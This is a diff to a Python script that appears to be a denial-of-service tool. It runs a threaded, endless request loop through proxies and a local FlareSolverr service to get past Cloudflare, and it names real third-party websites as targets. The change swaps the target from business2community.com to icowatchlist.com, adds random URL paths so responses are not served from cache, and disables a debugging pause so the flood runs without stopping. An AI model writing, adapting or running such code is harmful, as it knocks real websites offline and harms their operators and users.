@@ -92,7 +92,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 	while True:
 		try:
-			url = baseUrl #+ '/' + ''.join(random.choice(letters) for i in range(10)) 
+			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(10)) 
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
 			print(cookiesStr)
@@ -105,8 +105,8 @@ def attackUrlCF(baseUrl, threadNumber):
 			}
 
 			# checkIp()
-			print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
-			input()
+			# print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
+			# input()
 
 			requestsArr = []
 			for x in range(1):
@@ -141,7 +141,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
+	Thread(target=attackUrlCF, args=['https://icowatchlist.com/', i]).start()
 	time.sleep(30)
 input()
 
